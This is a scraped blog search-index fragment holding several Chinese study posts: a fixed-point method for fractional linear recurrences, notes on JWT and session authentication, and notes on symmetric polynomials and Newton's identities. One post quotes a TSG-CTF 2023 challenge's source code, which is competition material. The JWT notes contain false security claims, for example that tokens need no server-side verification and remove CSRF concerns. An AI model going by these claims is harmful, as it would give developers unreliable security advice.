$$\\frac{a_{n+1}-x_{1}}{a_{n+1}-x_{2}}=k \\cdot \\frac{a_{n}-x_{1}}{a_{n}-x_{2}},k=\\frac{A-Cx_{1}}{A-Cx_{2}}$$易知，$\\set{\\frac{a_{n}-x_{1}}{a_{n}-x_{2}}}$是以$\\frac{a_{1}-x_{1}}{a_{1}-x_{2}}$为首项，$k$为公比的等比数列 代换得出$a_{n}$的解析式并不困难。 那么他们从何而来？ ","date":"2024-04-06","objectID":"/fix-point/:6:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"分式线性变换的概念与分式线性递推式的不动点解法由来 定义：具有以下形式的函数$f:\\mathbb{C} \\rightarrow \\mathbb{C}$,称为分式线性变换（linear fractional transformation): $$f(x) = \\frac{Ax+B}{Cx+D}\\quad(A,B,C,D \\in \\mathbb{C},AD-BC \\ne 0)$$ 因为德国数学家奥古斯特·莫比乌斯曾对其进行过大量研究，所以分式线性变换也叫做莫比乌斯变换（Möbius transformation） 因式分解后可把$f(x)$写成： $$f(x)=\\frac{BC-AD}C\\frac1{Cx+D}+\\frac AC$$ 可以验证在实数域上，这是一个可逆变换，具有以下性质： $y=f(x)$的逆变换为$x= \\frac{-Dy+B}{Cy-A}$。 一次函数是一个特殊情况。 分式线性变换之间的复合结果仍然是分式线性变换。 根据不动点的性质，对于变换及其逆变换，不动点一一对应。 为什么两边同时减去不动点？ 按照待定系数法的思路，假定对分式线性变换解析式的$f(x)$两侧同时减去某个合适的常数P再同时取倒数后，能得到形式一致的分母。先 $$ \\begin{aligned}\u0026\\text{做第一步减法,得:}\\\\\\\\\u0026a_{n+1}-P=\\frac{Aa_n+B}{Ca_n+D}-P=\\frac{Aa_n+B-PCa_n-DP}{Ca_n+D}=\\frac{(A-PC)a_n+(B-DP)}{Ca_n+D}\\end{aligned} $$ 要使上面的式子取倒数后的分母满足要求，由于分母取倒数前是位于分子的位置，基于前面的解题实例可知，我们只需要保证上式最左边的量与最右边的分子形式相似即可。 即只需要使$a_{n+1}-P$与$(A-PC)a_n+(B-DP)$的对应系数成相同比例即可。即： $$\\begin{aligned}\\frac{1}{A-PC}=\\frac{-P}{B-DP}\\end{aligned}$$ $$P=\\frac{B-DP}{CP-A}$$ 显然，这个所需的P值是$f(x)$的反函数的不动点。根据前面总结的性质，可知P也是$f(x)$的不动点。 即对$f(x)$两侧同时减去其不动点后，再取同时倒数，就一定能构造出一次的常系数非齐次递推式。 桥函数 上述推导，无论赛题或概念都在中间利用了大量中间函数。 考虑到分式线性变换性质3.，我们继续探究： 首先由于一次函数属于特殊的分式线性变换，而且分式线性变换是可逆变化，所以自然想到能否将分式线性递推式还原为某种更简单的一次线性递推式的形式。求出与之相关的一次线性递推式的迭代结果后，再利用逆变换反推出原递推式的多次迭代结果。 另一方面，我们已经知道使用不动点法可以简化一次线性递推式的求解，我们希望将不动点也整合到分式线性变换还原为线性递推式的系数配凑过程中。 定义: 使得$f(x)$可以与另一个函数$g(x)$建立下列联系的可逆函数$T(x)$叫做桥函数： $$f(x)= T^{-1}(g(T(x)))$$此时，$f(x)$和$g(x)$叫做关于桥函数$T(x)$的一对相似函数,或者说$f(x)$和$g(x)$关于桥函数$T(x)$互为相似函数。 用拓扑学术语来说，桥函数是一种同胚变换(homeomorphism) 它建立了$f(x)$和$g(x)$之间的拓扑共轭(topological conjugacy) 笔者的拓扑记忆也是较为模糊，如有疏漏欢迎勘误。 桥函数是计算函数迭代或构造数列的辅助函数。 通过找到合适的桥函数，将不易得到迭代公式的$f(x)$转化为容易得到迭代公式的形式更简单的$g(x)$, 计算完$g(x)$的$n$次迭代后，再使用桥函数的逆变换（性质保证逆变换一定存在）。应用这种思路把函数迭代问题转化为寻找一个良好的桥函数问题。 那么很容易的，可以得到使用不动点法的动机： 借住不动点，可以探测目标桥函数的一些性质，以便确定桥函数的待定系数。只要确定了待定系数的细节，就可以通过相似变换的方法得到原函数的$n$次迭代式。 ","date":"2024-04-06","objectID":"/fix-point/:7:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"举例 假设$f(x)=T^{-1}(g(T(x)))$,且$x_{0}$是$f(x)$的不动点，那么$T(x_{0})$一定也会是$g(x)$的不动点。这说明，如果求出$f(x)$的不动点，并且找到结构合适的$T(x)$，那么$g(x)$的不动点是不言自明的。 通常为了便于求解$g(x)$的$n$次迭代式，可以尝试将$g(x)$取为如下形式： $$\\begin{aligned} \u0026\\bullet g(x) =x+a \\\\\\\\ \u0026\\bullet g(x) =ax \\\\\\\\ \u0026\\bullet g(x) =ax^2 \\\\\\\\ \u0026\\bullet g(x) =ax^3 \\end{aligned}$$对于这几种情况，$g(x)$的不动点为0或$\\infty$。此时如果$f(x)$只有唯一的不动点a，可以考虑取$g(x)=x-a$或$g(x)=\\frac1{x-a}$;如果$f(x)$有2个相异的不动点a和b，则可以考虑取$g(x)=\\frac{x-a}{x-b}$。 这样的桥函数思想是优美的。 另举一例 (from TSG-CTF 2023) import os import random import string flag = os.getenv(\"FLAG\", \"FAKECTF{THIS_IS_FAKE}\") key = [random.randrange(10 ** 4) for _ in flag] cs = string.printable[:-6] def r(k): for _ in range(k): random.seed(x := random.randrange(20231104, 20231104 * 10)) return x random.seed(int(input(\"seed: \"))) print('flag:', ''.join([cs[(cs.index(f) + r(k)) % len(cs)] for f, k in zip(flag, key)])) ","date":"2024-04-06","objectID":"/fix-point/:8:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"Jwt json web token 跨域认证的问题 跨域认证指的是在不同域名下的应用程序之间进行身份验证和授权的过程。由于浏览器的同源策略，不同域名下的应用程序不能直接访问对方的信息，因此在进行跨域认证时需要使用特定的技术手段来实现。 浏览器的同源策略（Same Origin Policy）是一种安全机制，用于限制一个源（域名、协议和端口号的组合）的文档或脚本如何与其他源的资源进行交互。同源策略的目的是防止恶意网站通过脚本等方式获取用户的敏感信息或进行恶意操作。 同源策略的限制包括以下几个方面： Cookie、LocalStorage和IndexDB等存储机制的限制：同源的文档可以共享这些存储机制，但不同源的文档无法访问彼此的存储数据。 DOM操作的限制：同源的文档可以通过JavaScript等脚本访问彼此的DOM元素，但不同源的文档无法访问彼此的DOM元素。 AJAX请求的限制：同源的文档可以通过XMLHttpRequest等方式进行AJAX请求，但不同源的文档无法进行跨域AJAX请求。 需要注意的是，同源策略只限制浏览器端的交互，服务器端不存在同源策略的限制。如果需要进行跨域交互，可以使用一些特殊的技术手段，如JSONP、CORS、代理服务器等。 ","date":"2024-04-04","objectID":"/jwt-note/:0:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"常用的跨域认证技术 CORS（跨域资源共享）：CORS是一种浏览器技术，通过在服务器端设置响应头信息，允许跨域的请求进行访问。在进行跨域认证时，可以在服务器端设置CORS响应头，允许来自其他域名的请求访问。 JSONP（跨域JSON请求）：JSONP是一种利用script标签进行跨域请求的技术，它通过在请求中添加一个回调函数名参数，让服务器将数据包装成一个函数调用返回给客户端，从而实现跨域请求。 代理服务器：代理服务器是一种在服务器端进行跨域请求的技术，它通过在服务器端设置代理服务器，将跨域请求转发到目标服务器上进行处理，再将结果返回给客户端。 OAuth2.0：OAuth2.0是一种开放标准，用于授权第三方应用程序访问用户资源的过程。在进行跨域认证时，可以使用OAuth2.0协议来进行身份验证和授权，让第三方应用程序获得访问用户资源的权限。 ","date":"2024-04-04","objectID":"/jwt-note/:1:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"session 和 jwt Session模式和JWT模式都是常见的身份验证和授权机制，二者有以下几点不同： 存储方式不同：Session模式将用户身份信息存储在服务端的内存或者数据库中，而JWT模式将用户身份信息存储在客户端的浏览器中。 状态管理方式不同：Session模式需要服务端在每次请求中校验用户的身份信息，而JWT模式则不需要服务端校验，只需要在客户端解密和校验即可。 扩展性不同：Session模式需要在服务端存储用户身份信息，因此需要考虑存储容量和扩展性等问题，而JWT模式不需要存储用户身份信息，因此具有更好的扩展性。 跨语言支持不同：Session模式需要服务端和客户端使用相同的编程语言实现，而JWT模式可以跨越多种编程语言和平台。 安全性不同：Session模式存在一定的安全风险，如会话劫持、会话固定等问题，而JWT模式可以通过加密和签名等方式提高安全性。 总的来说，Session模式适用于单一的应用程序，而JWT模式适用于多个应用程序或者服务之间的信息传输。 Token 的使用 用户信息加密填入 token 中，服务器不保存任何用户信息，保存密钥信息，通过使用特定加密算法验证 token。 client – uid+passwd 请求 sever – 收到并验证 sever – 验证成功后签发 token 并将 token 返回客户端 client – 请求服务器资源需要附带 token （在 cookie 或 header 中携带） sever – 收到请求核验 token，成功则返回所请求数据 基于token的认证方式相对于session认证方式更加节约服务器资源，对移动端和分布式更友好。 支持跨域访问。token不使用cookie而直接放入请求头中，跨域后不存储信息丢失。 无状态：token机制在服务端不储存session信息，token自身携带登录用户的信息。 更加适用CDN: 可以通过分发网络请求服务端的所有资料。 更适用于移动端：当客户端时非浏览器平台时，cookie不被支持，而token可以实现。 无需考虑CSRF: 由于不再依赖cookie,token认证不会发生CSRF无需考虑CSRF的防御。 CRSF（Cross-Site Request Forgery）是一种网络攻击方式，攻击者通过伪造用户已经授权过的请求来执行恶意操作。攻击者通常会通过诱骗用户点击链接或访问网站来实现攻击。CRSF攻击可以导致用户的账户被盗、信息泄露等安全问题。 CDN（Content Delivery Network）是一种分布式网络架构，通过在全球各地部署服务器节点，将静态资源（如图片、视频、脚本等）缓存在离用户最近的服务器上，从而提高资源访问速度和用户体验。CDN的主要功能包括：加速访问速度、提高网站可用性、降低服务器负载、保障安全性等。通过使用CDN，网站可以更快地响应用户请求，减少带宽消耗和服务器压力，提高网站的稳定性和安全性。 Json Web Token JWT的本质是一个字符串。它将用户信息保存到一个Json字符串中，然后进行编码后得到一个JWT token，并且这个JWT token带有签名信息，接收后可以校验是否被篡改，所以可以用于在各方之间安全地将信息作为Json对象传输。 JWT的认证流程如下： Session Session 的抽象概念是会话，是无状态协议通信过程中，为了实现中断/继续操作，将用户和服务器之间的交互进行的一种抽象；具体来说，是服务器生成的一种 Session 结构，可以通过多种方式保存，如内存、数据库、文件等，大型网站一般有专门的 Session 服务器集群来保存用户会话。 session 是另一种记录服务器和客户端会话的机制。 session 是基于cookie 实现的，session 存储在服务器端，session ID 会被 cookie 保存到客户端的 cookie 中。 服务器执行 session 机制时，生成 session ID 发送客户端，客户端请求将 ID 加入 http 发送服务端，ID 本地保存，容器为 cookie，因此 ban 掉 cookie 时，session 不能正确使用。 session ID 在服务端 进行匹配。 cookie 客户端保存用户信息的一种机制，用来记录用户信息。服务器存储在本地机器上的一小段文本，会被下一次请求携带发往服务器。 cookie 不可跨越，每个 cookie 绑定单一域名，无法在别的域名下使用，一级域名和二级域名互通，（凭借 domain） cookie 会根据上 http 响应报文中的的 set-cookie 的首部字段信息，通知客户端保存 cookie。当下客户端再向服务端发起请求时，cookie 自动加入。 属性： Http协议是一种无状态的协议 http 无状态的协议 （对于事务处理无记忆功能，对话完成后，服务端不保存任何会话信息。） 每一个 http 完全独立 服务端无法 确认当前访问者的身份信息，无法分辨上一次的请求发送者和这一次的是否相同。下一次请求时，仍然需要认证。为了解决这个问题，提出了cookie的解决方案： Session的一些问题 每个用户的登录信息都会保存到服务器的session中，随着用户的增多，服务器开销会明显增大 由于session是存在与服务器的物理内存中，所以在分布式系统中，这种方式将会失效。虽然可以将session统一保存到Redis中，但是这样做无疑增加了系统的复杂性，对于不需要redis的应用也会白白多引入一个缓存中间件 无cookie时失效，例如非浏览器的移动端、手机移动端等等。 cookie截获导致的CSRF 中间件的存在导致消息可能转发多次 后端部署复杂 由于cookie的不可跨域性，session的认证也无法跨域，不适用于单点登录（SSO） 单点登录（Single Sign-On，简称SSO）是一种身份认证机制，允许用户使用一组凭据（如用户名和密码）登录到多个应用程序或系统中，而无需为每个应用程序单独进行身份验证。在SSO中，用户只需进行一次登录，就可以访问多个应用程序，从而提高用户体验和工作效率。SSO通常使用集中式认证服务来管理用户身份信息和授权访问权限，例如OAuth、OpenID Connect等。SSO的优势包括降低密码管理成本、提高安全性、增强用户体验等。 跨域认证（Cross-Origin Authentication）是指在不同域之间进行身份认证的过程。由于同源策略的限制，不同域之间的页面无法直接访问彼此的Cookie信息，因此跨域认证需要使用特殊的技术手段来实现。常见的跨域认证方式包括OAuth、OpenID Connect等。OAuth是一种基于令牌的授权机制，允许用户授权第三方应用程序访问其资源，而无需将用户名和密码直接提供给第三方应用程序。OpenID Connect是基于OAuth 2.0的身份验证协议，提供了一种标准化的方式来验证用户身份和授权访问权限。通过使用这些跨域认证技术，应用程序可以安全地进行跨域身份认证，提高用户体验和安全性。 Jwt认证的一些优势 数据量小，传输迅速 Json加密形式保存在客户端，可跨语言，原则上支持各种web形式。 无需在服务器保存会话信息。 适用于分布式、移动端 SSO友好 故常见的分布式应用和单点式应用更加适合JWT。 Zero Turst 传统的Session和JWT权限管理方式都是基于令牌的方式，而零信任权限管理则更加注重身份验证和访问控制。在零信任模型中，每个用户和设备都需要进行身份验证，并且需要对其进行访问控制，以确保只有经过授权的用户和设备可以访问受保护的资源。与传统的Session和JWT相比，零信任权限管理更加安全和可靠，因为它采用了多层次的安全防护措施，包括身份验证、访问控制、数据加密等。同时，零信任权限管理还可以实现更细粒度的访问控制，以确保每个用户和设备只能访问其需要的资源，从而提高了系统的安全性和可靠性。 Jwt的结构 JWT由三部分构成：Header+Payload+Signature. 传输时，各部分分别base64编码后以.连接，形成最终传输字符串。 每部分对应作用： header和payload可以可解码出原文，获得哈希签名和有效数据。此处有效数据可以另行加密。 signature使用散列函数，无法解码，用于校验token是否有所修改： 校验过程： header中获取加密算法，利用算法加上SecretKey对header、payload进行加密，比对加密后的数据和客户端发送来的是否一致。主一般对于md5系列，SecretKey代表盐值。 ","date":"2024-04-04","objectID":"/jwt-note/:2:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Header { \"alg\": \"HS256\", \"typ\": \"JWT\" } alg即algorithm，默认HS256（HMAC SHA256) typ即这个token的type，jwt类型写为 “JWT” ","date":"2024-04-04","objectID":"/jwt-note/:3:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Payload 官方给出七个字段： iss (issuer)：签发人 exp (expiration time)：过期时间 sub (subject)：主题 aud (audience)：受众 nbf (Not Before)：生效时间 iat (Issued At)：签发时间 jti (JWT ID)：编号 也可自定义私有字段 { \"sub\": \"Test Text\", \"name\": \"HaLois\", \"admin\": true } 注意，JWT 默认是不加密的 ","date":"2024-04-04","objectID":"/jwt-note/:4:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Signature Signature 部分是对前两部分的签名，防止数据篡改。 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256） 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用\"点\"（.）分隔，就可以返回给用户。 Jwt的分类 nosecure JWT:未经signature，不安全。 JWS:经过签名。 JWE:payload部分经过加密。 ","date":"2024-04-04","objectID":"/jwt-note/:5:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Nosecure Jwt header部分无指定签名算法。 { \"alg\": \"none\", \"typ\": \"JWT\" } ","date":"2024-04-04","objectID":"/jwt-note/:6:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Jws JWT Signature,结构为 Nosecure Jwt基础上增加头部算法声明，并在最后添加签名。 完成签名需要的SecretKey: 对称加密：可用于生成签名于验证签名。 非堆成加密：SecretKey指私钥，只能用于生成签名，公钥用于验证签名。 JWT的密钥或密钥对统称为JSON Web Key JWT签名算法： HMAC 【哈希消息验证码（对称）】：HS256/HS384/HS512 RSASSA【RSA签名算法（非对称）】：RS256/RS384/RS512 ECDSA 【ECC签名算法（非对称）】：ES256/ES384/ES512 在实际开发中需要用下列手段来增加JWT的安全性： JWT在请求头中传递的，故为避免网络劫持，推荐使用HTTPS来传输，更加安全 JWT的哈希签名的密钥是存放在服务端的，所以只要服务器不被攻破，理论上JWT是安全的。因此要保证服务器的安全 JWT可以使用暴力穷举来破解，所以为了应对这种破解方式，哈希签名密钥(盐值)需要添加生命周期。 Jwt的特点 JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。 JWT 不加密的情况下，不能将秘密数据写入 JWT。 JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。 JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。 JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。 为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。 References 阮一峰の博客 官方文档 零信任安全框架-奇安信 IBM的介绍 How2Use ","date":"2024-04-04","objectID":"/jwt-note/:7:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"任何一个一元复系数多项式方程都至少有一个复数根。也就是说，复数域是代数封闭的 复数域代数封闭。 代数封闭：域$F$被称为代数闭域，当且仅当任何系数属于$F$且次数大于零的单变量多项式在$F$里至少有一个根。代数闭域一定是无限域。 不得不感慨,还是需要捡起一些遗忘的科目:)，回忆下笔者和Galois理论的缘起。 对称多项式基本定理 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:0:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"对称多项式 对称多项式： 对于域$F$上的$n$元多项式$f(x_{1},x_{2},x_{3},\\dots,x_{n})\\in F[x_{1},x_{2},\\dots,x_{n}]$,如果对于任意两个变量对换，原多项式保持不变，则这个多项式称为对称多项式。 等价定义： $$ \\forall σ \\in \\mathbb{S_n}, f(x_{σ(1)},x_{σ(2)},\\dots,x_{σ(n)})=f(x_{1},x_{2},\\dots,x_{n}) $$由此可以推出： 对于多项式 $f(x_{1},\\dots,x_{n})$ 中的 $m$ 次项 $$ \\prod_{k=0}^{m} x_{i_{k}}^{j_{k}} $$在置换后成为 $\\prod_{k=0}^{m} x_{σ(i_{k})}^{j_{k}}$ 依然是 $f(x_{1},\\dots,x_{n})$ 中的一项；故在所有置换下，得到所有项构成一个 $m$ 次齐次多项式： $$ \\sum_{σ \\in \\mathbb{Sn}} \\prod_{k=0}^{m} x_{σ(i_{k})}^{j_{k}} $$任何一个单项式都可以置换产生一个齐次多项式。 例： 最简单的但现实每个变量次数不超过$1$： $$ σ_{1} = \\underset{1\\le i \\le n}{\\sum} x_{i} = x_{1}+x_{2}+x_{3}+\\dots+x_{n} $$例： 二次式$x_{1}x_{2}$经过置换可以得到二次齐次对称多项式： $$σ_{2} = \\underset{1\\le i \\le j \\le n}{\\sum}x_{i}x_{j} = x_{1}x_{2}+x_{1}x_{3}+x_{1}x_{n}+x_{2}x_{3}+\\dots+x_{n-1}x_{n} $$ 例： 三次情况： $$ σ_{3}= \\underset{1\\le i \\le j \\le k \\le n}{\\sum } x_{i}x_{j}x_{k} $$ 一般的，对于k次多项式： $$ σ_{k}= \\underset{1\\le i_{1} \\le i_{2} \\dots i_{n-1}\\le i_{n} \\le n}{\\sum} x_{i_{1}}x_{i_{2}}\\dots x_{i_{k}} $$基本对称多项式 特别地，对于$n$次式 $x_{1}x_{2}\\dots x_{n}$ 本身就是一个$n$次齐次对称多项式$σ_{n}$。 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:1:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"推论 根据代数基本定理，在一个代数封闭域$F$上的$n$次首一多项式 $$ f'(x) = x^{n} + \\sum_{i=1}^{n} a_{i}x^{n-i} $$都有$n$个零点，可分解为 $$f'(x)= \\prod_{i=1}^{k}(x-x_{i}) $$展开后得到： 首一多项式的韦达定理 $$ f'(x)=x^{n}-σ_{1}x^{n-1}+σ_{2}x^{n-2}+\\dots+(-1)^kσ_{k}x^{n-k}+(-1)^nσ_{n} $$对应相等得到根与系数关系： $$ σ_{k} = (-1)^{k} a_{k}, 1\\le k \\le n $$一般的韦达定理 定义 $$ f(x) = \\sum_{i=0}^{n} a_{i} x^{n-i} $$ 注意到上述特殊 $ f’(x) $ 为 $ F(x) $ 的 $ a_{0}=1 $ 的特殊情况， 所有系数均除以 $ f(x) $ 的 $ a_{0} $ ,现在重新定义域 $ F $ 上一般多项式的韦达定理。 一般的加入最高次项系数： $$ \\sigma_k^{\\prime}=(-1)^k\\frac{a_k}{a_0},1\\leq k\\leq n $$ 由此完成上述概念阐发的韦达定理内容。 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:2:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"基本多项式定理 对于任意域$F$上的多项式$f\\in F(x_{1},x_{2},\\dots,x_{n})$, 都存在多项式 $g \\in F[x_{1},x_{2},\\dots,x_{n}]$使得$f=g(σ_{1},σ_{2},\\dots,σ_{n})$ 这一定理说明了基本多项式与原始多项式可相互表出。 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:3:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"基本对称多项式定理的证明 对于变量个数$n$进行归纳： $n=1$时，结论成立。 假设$n-1$个变量时，结论成立，对于n个变量，结论也成立 $$σ_{k}= \\sum_{1\\le i_{1} \\le \\dots \\le i_{k} \\le n} x_{i_{1}x_{i_{2}}}\\dots x_{i_{k}}$$ $σ_{k}$为n元基本对称多项式。 $$\\tau_{k}= \\sum_{1\\le i_{1} \\le \\dots \\le i_{k} \\le n} x_{i_{1}x_{i_{2}}}\\dots x_{i_{k}}$$ $\\tau_{k}$为$n-1$元基本多项式。 对于 $$σ_{1}= \\tau_{1}+x_{n},\\tau_{1}=σ_{1}-x_{n}$$ $$σ_{2} = \\tau_{2} +\\tau_{1}x_{n},\\tau_{2}=σ_{2}-x_{n}σ_{1}+x_{n}^2$$ $$σ_{3}=\\tau_{3}+\\tau_{2}x_{n},\\tau_{3}=σ_{3}-σ_{2}x_{n}+\\tau_{1}x_{n}^2-x_{n}^3$$ $$\\dots$$ $$σ_{n-1}=\\tau_{n-1}+\\tau_{n-2}x_{n}$$ $$σ_{n}=\\tau_{n-1}x_{n},0=σ_{n}-σ_{n-1}x_{n}+\\dots+(-1)^{n}σ_{1}x^{n-1}+(-1)^{n+1}x^n_{n}$$所以对于是任意$n$元多项式$f\\in F(x_{1},\\dots,x_{n})$,可以写成 $$f= g_{n-1}x_{n}^{n-1}+\\dots+g_{1}x_{1}+g_{0} = \\sum_{i=0}^{n-1}g_{i}x^{i_{n}},g_{k}\\in F(x_{1},x_{2},\\dots,x_{n-1})$$ 注意到$f$为$n$元对称多项式，可得$f$在$x_{1},x_{2},\\dots,x_{n-1}$的任意置换下不变。由此可得，$g_{k}$是$n-1$元对称多项式。 由归纳假设可得，$g_{k}$可由$\\tau_{1},\\tau_{2}\\dots \\tau_{n-1}$表出，即有： $$ g_k=g_k(\\tau_1,\\tau_2,\\cdots, \\tau_{n-1}),~0\\leq k\\leq n. $$ 又$\\tau_{k}$可用$σ_{1},σ_{2},\\dots,σ_{n-1}$表出，代入： $$f=f_{n-1}x_n^{n-1}+\\cdots+f_1x_n+f_0$$其中 $f_k=f_k(σ_1,σ_2,\\cdots,σ_n)$ 是 n 元对称多项式。 为了证明 $f$ 可以用 $σ_1,σ_2,\\cdots, σ_n$ 多项式表示，只需要证明 $f_k=0,~1\\leq k\\leq n-1$ ，由此得到 $f=f_0$ . 把 $x_i$ 和 $x_n$ 对换得到 $f=f_{n-1}x_i^{n-1}+f_{n-2}x_i^{n-2}+\\cdots+f_1x_i+f_0,~ 1\\leq i\\leq n.$ 矩阵形式可表示为范德蒙矩阵系数形式： $$ \\begin{pmatrix} 1\u0026x_1\u0026x_1^2\u0026\\cdots\u0026 x_1^{n-1}\\\\\\\\ 1\u0026x_2\u0026x_2^2\u0026\\cdots\u0026 x_2^{n-1}\\\\\\\\ \\vdots\u0026\\vdots\u0026\\vdots\u0026\\cdots\u0026\\vdots\\\\\\\\ 1\u0026x_n\u0026x_n^2\u0026\\cdots\u0026 x_n^{n-1} \\end{pmatrix} \\begin{pmatrix} f_0\\\\\\\\ f_1\\\\\\\\ \\vdots\\\\\\\\ f_{n-1} \\end{pmatrix}= \\begin{pmatrix} f\\\\\\\\ f\\\\\\\\ \\vdots\\\\\\\\ f \\end{pmatrix} $$ 注意到解的唯一性，以及特解$f_{1}=f_{2}=\\dots=f_{n-1}=0,f_{0}=f$为特解，可得$f=f_{0}$ ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:3:1","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"经典表出 对于三次情况： 牛顿恒等式 特殊的对称多项式： $$ S_{k} = σ_{i=1}^{n} x_{i}^{k} = x_{1}^k+x_{2}^k,+x_{3}^k+\\dots+x_{n}^k,k=0,1,\\dots $$ 牛顿恒等式 设 $x_1,x_2,\\ldots,x_n$ 是 $a_nx^n+a_{n-1}x^{n-1}+\\cdots+a_1x+a_0=0$ 的 n 个根，定义 $$\\begin{aligned} e_{0} \u0026=1 \\\\\\\\ e_{1} \u0026=x_{1}+x_{2}+\\cdots+x_{n} \\\\\\\\ e_{2} \u0026=\\sum_{1 \\leq in \\end{aligned}$$ 根据韦达定理可知： $$e_{1}=-\\frac{a_{n-1}}{a_{n}}, e_{2}=\\frac{a_{n-2}}{a_{n}}, \\ldots, e_{n}=(-1)^{n} \\frac{a_{0}}{a_{n}} . $$ 定义 $$p_{k}=x_{1}^{k}+\\cdots+x_{n}^{k},k\\in\\{1,2,3\\ldots\\}$$有了对称多项式的概念和基本定理，不难理解牛顿恒等式的推导。 也注意到这里 $$\\begin{aligned} e_{0} \u0026=σ_{0} \\\\\\\\ e_{1} \u0026=σ_{1} \\\\\\\\ e_{2} \u0026= σ_{2} \\\\\\\\ \u0026 \\vdots \\\\\\\\ e_{n} \u0026=σ_{n} \\\\\\\\ e_{k} \u0026=0, \\quad \\text { for } k\u003en \\end{aligned}$$韦达定理可知： $$e_{i} = (-1)^{n} \\frac{a_{n-i}}{a_{n}}$$ 基本定理可得 $$p_k=\\begin{cases}\u0026e_1p_{k-1}-e_2p_{k-2}+\\cdots+(-1)^{k-2}e_{k-1}p_1+(-1)^{k-1}ke_k \u0026k\\leq n \\\\\\\\ \u0026e_1p_{k-1}-e_2p_{k-2}+\\cdots+(-1)^{n-1}e_np_{k-n} \u0026k\u003en\\end{cases}$$利用递归计算$p_{k}$ $$P_i=e_iP_{i-1}-e_2P_{i-2}+\\cdots+(-1)^{k+1}e_kP_{i-k}$$高联科目一 Let $r_{1},r_{2},r_{3},r_{4},r_{5}$ be roots of $x^5+5x^4+10x^3+10x^2+6x+3$ Compute $$ (r_{1}+5)^5+(r_{2}+5)^5+(r_{3}+5)^5+(r_{4}+5)^5+(r_{5}+5)^5 $$写出$f(x+5)$并化简，然后得到系数，代入恒等式即可。 不过可以有更多小Trick :) $$f(x+5) = p_{5}+25p_{4}+250p_{3}+1250p_{2}+3125p_{1}+3125 \\times 5$$ $p_{i}$的计算过程: $$\\begin{aligned} p_1\u0026=e_1p_0=-5 \\\\\\\\ p_2\u0026=e_1p_1-2e_2=(-5)^2-2\\cdot10=5 \\\\\\\\ p_3\u0026=e_1p_2-e_2p_1+3e_3=(-5)\\cdot5-10\\cdot(-5)+3\\cdot(-10)=-5 \\\\\\\\ p_4\u0026=e_1p_3-e_2p_2+e_3p_1-4e_4=1 \\\\\\\\ p_5\u0026=e_1p_4-e_2p_3+e_3p_2-e_4p_1+5e_5=10\\\\\\\\ \\end{aligned}$$ Trick: $x^5+5x^4+10x^3+10x^2+6x+3=(x+1)^5+(x+1)+1$ 令 $r_i=s_i+1,i\\in{1,2,3,4,5}$ $\\sum_{i=1}^5(s_i+5)^5=\\sum_{i=1}^5(r_i+4)^5$ 其中， $r_i,i\\in{1,2,3,4,5}$ 是方程 $x^5+x+1=0$ 的5个根. 